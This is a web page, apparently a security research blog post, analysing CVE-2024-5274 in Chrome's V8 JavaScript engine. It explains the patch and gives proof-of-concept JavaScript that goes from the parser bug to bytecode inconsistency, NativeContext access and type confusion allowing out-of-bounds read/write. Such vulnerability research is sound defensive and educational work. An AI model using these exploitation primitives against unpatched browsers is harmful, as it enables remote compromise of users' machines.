<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes | DARKNAVY</title>
<meta name=keywords content><meta name=description content="In May of this year, we noticed that Chrome fixed a V8 vulnerability that was being exploited in the wild in this update. We quickly pinpointed the fix for this vulnerability and discovered that it was a rare bug in the Parser module, which piqued our interest greatly. This led to the following research.
From Patch to PoC
First, let&rsquo;s take a look at the patch for this vulnerability:
diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc
index 660fdd2e9ad..de4df35c0ad 100644
--- a/src/ast/scopes.cc
+++ b/src/ast/scopes.cc
@@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) {
     var->set_is_used();
     if (inner_scope_calls_eval_ && !var->is_this()) var->SetMaybeAssigned();
   }
-  DCHECK(!var->has_forced_context_allocation() || var->is_used());
+  CHECK(!var->has_forced_context_allocation() || var->is_used());
   // Global variables do not need to be allocated.
   return !var->IsGlobalObjectProperty() && var->is_used();
 }
diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
index 40914d39a4f..65c338f343f 100644
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -2661,6 +2661,7 @@ typename ParserBase<Impl>::BlockT ParserBase<Impl>::ParseClassStaticBlock(
   }

   FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope);
+  FunctionParsingScope body_parsing_scope(impl());
   AcceptINScope accept_in(this, true);

   // Each static block has its own var and lexical scope, so make a new var
The patch is very simple, the actual effective fix is just one line of code. This line introduces a variable of type FunctionParsingScope when parsing the static initialization block of a class. Let&rsquo;s examine what this newly introduced variable does:"><meta name=author content="DARKNAVY"><link rel=canonical href=https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><link crossorigin=anonymous href=/assets/css/stylesheet.38a584f0fc0f77186c8518d4117588a5b01cffe28707e993a6ae5cd5e2b0c5d0.css integrity="sha256-OKWE8PwPdxhshRjUEXWIpbAc/+KHB+mTpq5c1eKwxdA=" rel="preload stylesheet" as=style><link rel=icon href=https://www.darknavy.org/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.darknavy.org/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.darknavy.org/favicon-32x32.png><link rel=apple-touch-icon href=https://www.darknavy.org/apple-touch-icon.png><link rel=mask-icon href=https://www.darknavy.org/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><link rel=alternate hreflang=zh href=https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-LR4ZN1LSPS"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LR4ZN1LSPS")}</script><meta property="og:title" content="CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes"><meta property="og:description" content="In May of this year, we noticed that Chrome fixed a V8 vulnerability that was being exploited in the wild in this update. We quickly pinpointed the fix for this vulnerability and discovered that it was a rare bug in the Parser module, which piqued our interest greatly. This led to the following research.
From Patch to PoC
First, let&rsquo;s take a look at the patch for this vulnerability:
diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc
index 660fdd2e9ad..de4df35c0ad 100644
--- a/src/ast/scopes.cc
+++ b/src/ast/scopes.cc
@@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) {
     var->set_is_used();
     if (inner_scope_calls_eval_ && !var->is_this()) var->SetMaybeAssigned();
   }
-  DCHECK(!var->has_forced_context_allocation() || var->is_used());
+  CHECK(!var->has_forced_context_allocation() || var->is_used());
   // Global variables do not need to be allocated.
   return !var->IsGlobalObjectProperty() && var->is_used();
 }
diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
index 40914d39a4f..65c338f343f 100644
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -2661,6 +2661,7 @@ typename ParserBase<Impl>::BlockT ParserBase<Impl>::ParseClassStaticBlock(
   }

   FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope);
+  FunctionParsingScope body_parsing_scope(impl());
   AcceptINScope accept_in(this, true);

   // Each static block has its own var and lexical scope, so make a new var
The patch is very simple, the actual effective fix is just one line of code. This line introduces a variable of type FunctionParsingScope when parsing the static initialization block of a class. Let&rsquo;s examine what this newly introduced variable does:"><meta property="og:type" content="article"><meta property="og:url" content="https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/"><meta property="og:image" content="https://www.darknavy.org/images/white_logo.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-08-30T10:09:29+08:00"><meta property="article:modified_time" content="2024-08-30T10:09:29+08:00"><meta property="og:site_name" content="DARKNAVY"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.darknavy.org/images/white_logo.png"><meta name=twitter:title content="CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes"><meta name=twitter:description content="In May of this year, we noticed that Chrome fixed a V8 vulnerability that was being exploited in the wild in this update. We quickly pinpointed the fix for this vulnerability and discovered that it was a rare bug in the Parser module, which piqued our interest greatly. This led to the following research.
From Patch to PoC
First, let&rsquo;s take a look at the patch for this vulnerability:
diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc
index 660fdd2e9ad..de4df35c0ad 100644
--- a/src/ast/scopes.cc
+++ b/src/ast/scopes.cc
@@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) {
     var->set_is_used();
     if (inner_scope_calls_eval_ && !var->is_this()) var->SetMaybeAssigned();
   }
-  DCHECK(!var->has_forced_context_allocation() || var->is_used());
+  CHECK(!var->has_forced_context_allocation() || var->is_used());
   // Global variables do not need to be allocated.
   return !var->IsGlobalObjectProperty() && var->is_used();
 }
diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
index 40914d39a4f..65c338f343f 100644
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -2661,6 +2661,7 @@ typename ParserBase<Impl>::BlockT ParserBase<Impl>::ParseClassStaticBlock(
   }

   FunctionState initializer_state(&amp;function_state_, &amp;scope_, initializer_scope);
+  FunctionParsingScope body_parsing_scope(impl());
   AcceptINScope accept_in(this, true);

   // Each static block has its own var and lexical scope, so make a new var
The patch is very simple, the actual effective fix is just one line of code. This line introduces a variable of type FunctionParsingScope when parsing the static initialization block of a class. Let&rsquo;s examine what this newly introduced variable does:"><meta name=twitter:site content="@DarkNavyOrg"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://www.darknavy.org/blog/"},{"@type":"ListItem","position":2,"name":"CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes","item":"https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes","name":"CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes","description":"In May of this year, we noticed that Chrome fixed a V8 vulnerability that was being exploited in the wild in this update. We quickly pinpointed the fix for this vulnerability and discovered that it was a rare bug in the Parser module, which piqued our interest greatly. This led to the following research.\nFrom Patch to PoC First, let\u0026rsquo;s take a look at the patch for this vulnerability:\ndiff --git a/src/ast/scopes.cc b/src/ast/scopes.cc index 660fdd2e9ad..de4df35c0ad 100644 --- a/src/ast/scopes.cc +++ b/src/ast/scopes.cc @@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) { var-\u0026gt;set_is_used(); if (inner_scope_calls_eval_ \u0026amp;\u0026amp; !var-\u0026gt;is_this()) var-\u0026gt;SetMaybeAssigned(); } - DCHECK(!var-\u0026gt;has_forced_context_allocation() || var-\u0026gt;is_used()); + CHECK(!var-\u0026gt;has_forced_context_allocation() || var-\u0026gt;is_used()); // Global variables do not need to be allocated. return !var-\u0026gt;IsGlobalObjectProperty() \u0026amp;\u0026amp; var-\u0026gt;is_used(); } diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h index 40914d39a4f..65c338f343f 100644 --- a/src/parsing/parser-base.h +++ b/src/parsing/parser-base.h @@ -2661,6 +2661,7 @@ typename ParserBase\u0026lt;Impl\u0026gt;::BlockT ParserBase\u0026lt;Impl\u0026gt;::ParseClassStaticBlock( } FunctionState initializer_state(\u0026amp;function_state_, \u0026amp;scope_, initializer_scope); + FunctionParsingScope body_parsing_scope(impl()); AcceptINScope accept_in(this, true); // Each static block has its own var and lexical scope, so make a new var The patch is very simple, the actual effective fix is just one line of code. This line introduces a variable of type FunctionParsingScope when parsing the static initialization block of a class. Let\u0026rsquo;s examine what this newly introduced variable does:\n","keywords":[],"articleBody":"In May of this year, we noticed that Chrome fixed a V8 vulnerability that was being exploited in the wild in this update. We quickly pinpointed the fix for this vulnerability and discovered that it was a rare bug in the Parser module, which piqued our interest greatly. This led to the following research.\nFrom Patch to PoC First, let’s take a look at the patch for this vulnerability:\ndiff --git a/src/ast/scopes.cc b/src/ast/scopes.cc index 660fdd2e9ad..de4df35c0ad 100644 --- a/src/ast/scopes.cc +++ b/src/ast/scopes.cc @@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) { var-\u003eset_is_used(); if (inner_scope_calls_eval_ \u0026\u0026 !var-\u003eis_this()) var-\u003eSetMaybeAssigned(); } - DCHECK(!var-\u003ehas_forced_context_allocation() || var-\u003eis_used()); + CHECK(!var-\u003ehas_forced_context_allocation() || var-\u003eis_used()); // Global variables do not need to be allocated. return !var-\u003eIsGlobalObjectProperty() \u0026\u0026 var-\u003eis_used(); } diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h index 40914d39a4f..65c338f343f 100644 --- a/src/parsing/parser-base.h +++ b/src/parsing/parser-base.h @@ -2661,6 +2661,7 @@ typename ParserBase::BlockT ParserBase::ParseClassStaticBlock( } FunctionState initializer_state(\u0026function_state_, \u0026scope_, initializer_scope); + FunctionParsingScope body_parsing_scope(impl()); AcceptINScope accept_in(this, true); // Each static block has its own var and lexical scope, so make a new var The patch is very simple, the actual effective fix is just one line of code. This line introduces a variable of type FunctionParsingScope when parsing the static initialization block of a class. Let’s examine what this newly introduced variable does:\nclass V8_NODISCARD FunctionParsingScope { public: explicit FunctionParsingScope(Impl* parser) : parser_(parser), expression_scope_(parser_-\u003eexpression_scope_) { parser_-\u003eexpression_scope_ = nullptr; } ~FunctionParsingScope() { parser_-\u003eexpression_scope_ = expression_scope_; } private: Impl* parser_; ExpressionScope* expression_scope_; }; This is an extremely simple class. What it does is store the current expression_scope_ in the parser_ when constructed and restore it when destructed. So the key point here is the ExpressionScope.\nDuring the syntax analysis phase, the parser divides different parts of the script into different Scopes. Simply put, Scope divides the range of variable usage. JavaScript has many different types of Scopes, such as Global scope, Module scope, Function scope, etc.\nTo better parse variables in different Scopes, developers introduced the concept of ExpressionScope. You can refer to this official document for a detailed concept. It is worth mentioning that ExpressionScope in V8 is a completely different concept from Scope despite their similar names. ExpressionScope is an intermediate variable that exists to facilitate parsing and is used to generate the actual Scope in the AST. Like Scope, ExpressionScope indexes the outer layers through its parent.\nReturning to this vulnerability, the newly added FunctionParsingScope variable blocks the ExpressionScope chain from indexing its parent. Therefore, the original vulnerability likely caused unexpected behavior in the parent ExpressionScope. Almost the only suspect function that references the parent is:\nvoid RecordThisUse() { ExpressionScope* scope = this; do { if (scope-\u003eIsArrowHeadParsingScope()) { scope-\u003eAsArrowHeadParsingScope()-\u003eRecordThisUse(); } scope = scope-\u003eparent(); } while (scope != nullptr); } Let’s check where this function is called:\n// Needs to be called if the reference needs to be available from the current // point. It causes the receiver to be context allocated if necessary. // Returns the receiver variable that we're referencing. V8_INLINE Variable* UseThis() { // ... var-\u003eset_is_used(); if (closure_scope == receiver_scope) { // It's possible that we're parsing the head of an arrow function, in // which case we haven't realized yet that closure_scope != // receiver_scope. Mark through the ExpressionScope for now. expression_scope()-\u003eRecordThisUse(); } else { // ... } This function handles a special variable this in JavaScript. In traditional functions, the this variable cannot be passed between function calls, such as:\nfunction showThis() { function innerThis() { return this; } console.log(this == innerThis()); } let obj = {}; obj.showThis = showThis; obj.showThis(); // output: false However, the arrow function introduced in ES6 solves this problem. The arrow function can normally use the outer this variable. To support this feature, parsing this requires special handling. As noted in the UseThis function, when V8 encounters the this variable, if the inner and outer Scopes are the same, it is possible that the parameters of an arrow function are being parsed, as shown in the following code:\nfunction foo() { (arg = this.a) =\u003e { console.log(arg); } } Since the arrow function’s Scope has not yet been allocated at this point, ExpressionScope is used to mark the usage of the this variable here, so that the this variable can be correctly allocated when the Scope is later assigned. In RecordThisUse, the function marks all parent ExpressionScope as using this.\nNow, recalling the transmission of this, it should be blocked during the function call process. The class static block should also be considered a function block. Therefore, the problem here is: using this in a class static block, transmitted through the ExpressionScope chain, will incorrectly mark the outer function as using this. The PoC is as follows:\nfunction f1() { (arg = class AAA { static { this; } }) =\u003e { } } f1(); Since the outer function f1 does not actually use this, but it is marked as has_forced_context_allocation, triggering a DCHECK when allocating this variable.\nConstructing Inconsistent Bytecode What kind of chaos can such a tiny error cause in the V8 engine? Let’s delve deeper into the generated bytecode.\nConstruct the following function:\nfunction f1() { function foo() { } (arg = class AAA { static { this; } }) =\u003e { } } The bytecode generated after the bug fix in the new version:\n[generated bytecode for function: f1 (0x234800198559 )] Bytecode length: 6 Parameter count 1 Register count 0 Frame size 0 40 S\u003e 0xee0000400a4 @ 0 : 85 00 00 02 CreateClosure [0], [0], #2 0xee0000400a8 @ 4 : 0e LdaUndefined 102 S\u003e 0xee0000400a9 @ 5 : af Return Constant pool (size = 1) 0xee000040071: [TrustedFixedArray] - map: 0x234800000595 - length: 1 0: 0x2348001986a1 The problematic bytecode in the old version:\n[generated bytecode for function: f1 (0x0e2b0019ab81 )] Bytecode length: 15 Parameter count 1 Register count 1 Frame size 8 Bytecode age: 0 19 E\u003e 0xe2b0019adc2 @ 0 : 84 00 01 CreateFunctionContext [0], [1] 0xe2b0019adc5 @ 3 : 1a fa PushContext r0 0xe2b0019adc7 @ 5 : 0b 02 Ldar 0xe2b0019adc9 @ 7 : 25 02 StaCurrentContextSlot [2] 63 S\u003e 0xe2b0019adcb @ 9 : 81 01 00 02 CreateClosure [1], [0], #2 0xe2b0019adcf @ 13 : 0e LdaUndefined 155 S\u003e 0xe2b0019add0 @ 14 : aa Return Constant pool (size = 2) 0xe2b0019ad91: [FixedArray] in OldSpace - map: 0x0e2b00000089 - length: 2 0: 0x0e2b0019ad2d 1: 0x0e2b0019ad5d As mentioned in the previous section, even if this is not used in the function f1, the bytecode still forcibly allocates the this variable. Here’s a detailed explanation of its bytecode:\nCreateFunctionContext creates a function context. PushContext replaces the current context with the newly created one, saving the old context. Ldar loads this into the accumulator. StaCurrentContextSlot stores the value in the accumulator into slot 2 of the current context. However, our goal is to achieve bytecode inconsistency within a single script execution to make it exploitable. After studying the PoC and analysis of CVE-2022-4262, leveraging the Bytecode flushing mechanism seems like a good idea. In V8, if a function remains unused after multiple garbage collections (GC), its bytecode will be reclaimed. When executed again, the parser will use previously stored results to regenerate the bytecode more quickly. For example, when parsing the head of an arrow function, the parser does not know whether it is dealing with a variable assignment or an arrow function parameter declaration during the first bytecode generation. However, in subsequent handling, it can determine that it is the head of an arrow function.\nWith this foundational knowledge, we actively triggered Bytecode flushing and successfully constructed inconsistent bytecode across two executions:\nf1(); flush_bytecode(); f1(); The bytecode of function f1 after flushing is consistent with the bytecode after the bug fix, i.e., it lacks the four bytecode instructions for constructing the Function Context.\nFailed Attempt Records This section does not affect the subsequent content. Readers can skip to the next section.\nIn reality, our research was not smooth sailing. Before constructing a practically useful inconsistency, we spent a considerable amount of time attempting another form of bytecode inconsistency.\nInitially, we observed the erroneous bytecode, which essentially stored an unnecessary this in the Function Context. The first idea that came to mind was: if there are other variables in the Function Context, due to the bytecode inconsistency, if an inner function uses the same slot index to access variables, some unexpected behavior might occur.\nWith this idea, we constructed the following PoC:\nfunction f1() { let a0 = 0, a1 = 1; function f2() { console.log('a0 = ' + a0); console.log('a1 = ' + a1); } function hax() { a0 = 0x1337; } (arg = class AAA { static { this; } }) =\u003e { } hax(); f2(); return hax; } // keep a reference to hax to make it consistent after flushing let hax = f1(); flush_bytecode(); console.log('after flush'); f1(); The output result is:\na0 = 4919 a1 = 1 after flush a0 = 0 a1 = 4919 As we can see, during the second execution, even though the object being assigned is a0, it is actually a1 that gets modified. Let’s inspect the bytecode of the function hax:\n[generated bytecode for function: hax (0x2e72000db2ed )] Bytecode length: 15 Parameter count 1 Register count 1 Frame size 8 Bytecode age: 0 763 S\u003e 0x2e72000dc35e @ 0 : 00 0d 37 13 LdaSmi.Wide [4919] 0x2e72000dc362 @ 4 : c5 Star0 0x2e72000dc363 @ 5 : 16 03 LdaCurrentContextSlot [3] 766 E\u003e 0x2e72000dc365 @ 7 : ab 00 ThrowReferenceErrorIfHole [0] 0x2e72000dc367 @ 9 : 0b fa Ldar r0 0x2e72000dc369 @ 11 : 25 03 StaCurrentContextSlot [3] 0x2e72000dc36b @ 13 : 0e LdaUndefined 778 S\u003e 0x2e72000dc36c @ 14 : aa Return Constant pool (size = 1) 0x2e72000dc331: [FixedArray] in OldSpace - map: 0x2e7200000089 - length: 1 0: 0x2e72000dad51 The bytecode generated for hax is the same both times, consistently reading the variable from slot 3 of the current Context. This is not an issue during the first execution because this is stored in slot 2 and a0 is stored in slot 3. However, during the second execution, V8 generates the correct bytecode for f1, where a0 is in slot 2 and a1 is in slot 3. The bytecode for hax does not update correctly, leading to the unexpected result above.\nWe attempted to exploit this bug to cause further type confusion, but all our methods failed:\nWe tried leveraging JIT optimization for accessing a0, then using the JIT-compiled function to access a1 after triggering the bug. However, this approach was not feasible, as variable modifications at the bytecode level are visible to the JIT engine. We attempted to use unexpected bytecode to access another variable, such as the following scenario: bytecode Foo only accepts parameters of type A, and using parameters of type B would cause type confusion. However, bytecode, being a higher-level construct, validates input parameter types, and the desired bytecode did not exist. Exploiting Bytecode Inconsistency Another Unexpected Behavior By examining the bytecode generated in two different instances, we observed the distinction lies in the presence or absence of the Function Context. Studying the bytecode revealed that there are two ways to load from the Context: LdaCurrentContextSlot and LdaContextSlot.\n// comments from src/interpreter/interpreter-generator.cc LdaCurrentContextSlot \u003cslot_index\u003e Load the object in |slot_index| of the current context into the accumulator. LdaContextSlot \u003ccontext\u003e \u003cslot_index\u003e \u003cdepth\u003e Load the object in |slot_index| of the context at |depth| in the context chain starting at |context| into the accumulator. Clearly, LdaContextSlot is more complex. Since context storage is stack-based, LdaContextSlot provides a more general way to load, allowing manual specification of the starting context and the required depth.\nFor instance, the following bytecode is a common combination to load a value:\n2807 S\u003e 0x1541001a24ba @ 0 : 14 ff 70 01 LdaContextSlot , [10], [1] 0x1541001a24be @ 4 : ab 00 ThrowReferenceErrorIfHole [0] 0x1541001a24c0 @ 6 : c5 Star0 Reflecting on the differences in bytecode generation, a new idea emerged: What if, during the second bytecode generation, no new Function Context was created, and the inner function LdaContextSlot retained the old depth? What would happen then?\nlet o0; function f1() { function hax() { %DebugPrint(o0); } // ... } The bytecode for the function hax is as follows:\n[generated bytecode for function: hax (0x00f9000de775 )] Bytecode length: 14 Parameter count 1 Register count 1 Frame size 8 Bytecode age: 0 2602 S\u003e 0xf9000e1256 @ 0 : 14 ff 02 01 LdaContextSlot , [2], [1] 0xf9000e125a @ 4 : ab 00 ThrowReferenceErrorIfHole [0] 0xf9000e125c @ 6 : c5 Star0 0xf9000e125d @ 7 : 65 aa 01 fa 01 CallRuntime [DebugPrint], r0-r0 0xf9000e1262 @ 12 : 0e LdaUndefined 2621 S\u003e 0xf9000e1263 @ 13 : aa Return Constant pool (size = 1) 0xf9000e1229: [FixedArray] in OldSpace - map: 0x00f900000089 - length: 1 0: 0x00f9000dad2d The output result is surprising:\nDebugPrint: 0xf9000d4089: [JSGlobalObject] in OldSpace - map: 0x00f9000d8395 \u003cMap[20](HOLEY_ELEMENTS)\u003e [DictionaryProperties] - prototype: 0x00f900092b7d \u003cObject map = 0xf9000d46a5\u003e - elements: 0x00f900000219 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - native context: 0x00f9000c3c2d \u003cNativeContext[281]\u003e - global proxy: 0x00f9000c3bf5 \u003cJSGlobalProxy\u003e - properties: 0x00f9000e0bbd \u003cGlobalDictionary[261]\u003e - All own properties (excluding elements): { Uint8Array: 0x00f9000c5be1 \u003cJSFunction Uint8Array (sfi = 0xf90008c131)\u003e (data, dict_index: 30, attrs: [W_C]) ... Where does this JSGlobalObject come from?\nThe answer lies in the NativeContext. By skipping a layer of the Function Context, we loaded from an outer layer of the expected context, which is the NativeContext.\nLet’s slightly modify the script to dump all objects in the NativeContext:\nlet o0, o1, o2, o3, ... function f1() { function hax() { %DebugPrint(o0); %DebugPrint(o1); %DebugPrint(o2); // ... } // ... The corresponding source code for these objects can be found here. The dumped results have also been made public.\nPlaying with NativeContext At this point, we can arbitrarily access objects within the NativeContext, which includes many objects that are normally inaccessible during JavaScript execution. For example, we can directly access a FixedDoubleArray within a double-typed array (the structure that actually stores the elements).\n// o155 in slot 157 DebugPrint: 0x272f000d1ba1: [FixedDoubleArray] in OldSpace - map: 0x272f0000090d \u003cMap(FIXED_DOUBLE_ARRAY_TYPE)\u003e - length: 64 0-63: 0 0x272f0000090d: [Map] in ReadOnlySpace - type: FIXED_DOUBLE_ARRAY_TYPE - instance size: variable - elements kind: HOLEY_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x272f00000251 \u003cundefined\u003e - prototype_validity cell: 0 - instance descriptors (own) #0: 0x272f00000295 \u003cDescriptorArray[0]\u003e - prototype: 0x272f00000235 \u003cnull\u003e - constructor: 0x272f00000235 \u003cnull\u003e - dependent code: 0x272f00000229 \u003cOther heap object (WEAK_ARRAY_LIST_TYPE)\u003e - construction counter: 0 However, attempting to use this type results in a crash.\nThis is because these types cannot be directly manipulated from JavaScript. Apart from some basic types, only types belonging to JSObject can be operated on by scripts.\nFurther research into other objects in the NativeContext reveals a large number of Map types.\n// o151 in slot 153 DebugPrint: 0x272f000d1b39: [Map] in OldSpace - type: JS_MAP_KEY_VALUE_ITERATOR_TYPE - instance size: 20 - inobject properties: 0 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x272f00000251 \u003cundefined\u003e - prototype_validity cell: 0x272f00000ac5 \u003cCell value= 1\u003e - instance descriptors (own) #0: 0x272f00000295 \u003cDescriptorArray[0]\u003e - prototype: 0x272f000d1251 \u003cObject map = 0x272f000d11e5\u003e - constructor: 0x272f000d1b19 \u003cJSFunction MapIterator (sfi = 0x272f00091e29)\u003e - dependent code: 0x272f00000229 \u003cOther heap object (WEAK_ARRAY_LIST_TYPE)\u003e - construction counter: 0 ... A Map is a fundamental and important type in V8, determining the type of a variable. If we can manipulate Maps, we can create a powerful exploitation primitive: Type Confusion.\nIn certain scenarios, V8 reads Maps from the NativeContext to create objects. For example, in src/builtins/promise-all.tq:\nconst arrayMap = *NativeContextSlot( nativeContext, ContextSlot::JS_ARRAY_PACKED_ELEMENTS_MAP_INDEX); // ... const valuesArray = NewJSArray(arrayMap, values); Although we cannot directly modify the Map objects, the NativeContext contains many Maps. If we read a Map from one slot and overwrite another slot’s Map with it, can we cause type confusion? The answer is yes!\nThe following code is a simple PoC:\nfunction f1() { function hax() { // o60 is JS_ARGUMENTS_OBJECT_TYPE map with FAST_SLOPPY_ARGUMENTS_ELEMENTS // o110 is JS_ARRAY_TYPE map with PACKED_DOUBLE_ELEMENTS o60 = o110; } // ... } // ... function hax2(a0) { // `arguments` is confused to double array now %DebugPrint(arguments); } hax2(); In the PoC, we confused the function’s arguments with a double-element array, causing an OOB read/write. By achieving this type confusion, we can proceed with the classic V8 exploitation techniques. The related PoC code and all native objects definitions have been made public in our GitHub repository.\nThus, through a seemingly insignificant issue in the parser, we managed to create a powerful exploitation primitive, allowing us to arbitrarily confuse different types within the JavaScript engine.\n","wordCount":"2748","inLanguage":"en","image":"https://www.darknavy.org/images/white_logo.png","datePublished":"2024-08-30T10:09:29+08:00","dateModified":"2024-08-30T10:09:29+08:00","author":{"@type":"Person","name":"DARKNAVY"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/"},"publisher":{"@type":"Organization","name":"DARKNAVY","logo":{"@type":"ImageObject","url":"https://www.darknavy.org/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://www.darknavy.org/ accesskey=h title="  (Alt + H)"><img src=https://www.darknavy.org/images/darknavy_shenlan_dot.png alt aria-label=logo height=20></a><div class=logo-switches><ul class=lang-switch><li>|</li><li><a href=https://www.darknavy.org/zh/ title=Chinese aria-label=Chinese>Zh</a></li></ul></div></div><ul id=menu><li><a href=https://www.darknavy.org/ title=Home><span>Home</span></a></li><li><a href=https://www.darknavy.org/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://www.darknavy.org/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.darknavy.org/>Home</a>&nbsp;»&nbsp;<a href=https://www.darknavy.org/blog/>Blog</a></div><h1 class="post-title entry-hint-parent">CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes</h1><div class=post-meta><span title='2024-08-30 10:09:29 +0800 CST'>August 30, 2024</span>&nbsp;·&nbsp;2748 words&nbsp;·&nbsp;DARKNAVY&nbsp;|&nbsp;Translations:<ul class=i18n_list><li><a href=https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/>Zh</a></li></ul></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#from-patch-to-poc>From Patch to PoC</a></li><li><a href=#constructing-inconsistent-bytecode>Constructing Inconsistent Bytecode</a></li><li><a href=#failed-attempt-records>Failed Attempt Records</a></li><li><a href=#exploiting-bytecode-inconsistency>Exploiting Bytecode Inconsistency</a><ul><li><a href=#another-unexpected-behavior>Another Unexpected Behavior</a></li><li><a href=#playing-with-nativecontext>Playing with NativeContext</a></li></ul></li></ul></nav></div></details></div><div class=post-content><p>In May of this year, we noticed that Chrome fixed a V8 vulnerability that was being exploited in the wild in <a href=https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_23.html>this update</a>. We quickly pinpointed the fix for this vulnerability and discovered that it was a rare bug in the Parser module, which piqued our interest greatly. This led to the following research.</p><h2 id=from-patch-to-poc>From Patch to PoC<a hidden class=anchor aria-hidden=true href=#from-patch-to-poc>#</a></h2><p>First, let&rsquo;s take a look at the <a href=https://chromium-review.googlesource.com/c/v8/v8/+/5553030>patch</a> for this vulnerability:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gh>diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc
</span></span></span><span class=line><span class=cl><span class=gh>index 660fdd2e9ad..de4df35c0ad 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/src/ast/scopes.cc
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/src/ast/scopes.cc
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) {
</span></span></span><span class=line><span class=cl><span class=gu></span>     var-&gt;set_is_used();
</span></span><span class=line><span class=cl>     if (inner_scope_calls_eval_ &amp;&amp; !var-&gt;is_this()) var-&gt;SetMaybeAssigned();
</span></span><span class=line><span class=cl>   }
</span></span><span class=line><span class=cl><span class=gd>-  DCHECK(!var-&gt;has_forced_context_allocation() || var-&gt;is_used());
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+  CHECK(!var-&gt;has_forced_context_allocation() || var-&gt;is_used());
</span></span></span><span class=line><span class=cl><span class=gi></span>   // Global variables do not need to be allocated.
</span></span><span class=line><span class=cl>   return !var-&gt;IsGlobalObjectProperty() &amp;&amp; var-&gt;is_used();
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl><span class=gh>diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
</span></span></span><span class=line><span class=cl><span class=gh>index 40914d39a4f..65c338f343f 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/src/parsing/parser-base.h
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/src/parsing/parser-base.h
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -2661,6 +2661,7 @@ typename ParserBase&lt;Impl&gt;::BlockT ParserBase&lt;Impl&gt;::ParseClassStaticBlock(
</span></span></span><span class=line><span class=cl><span class=gu></span>   }
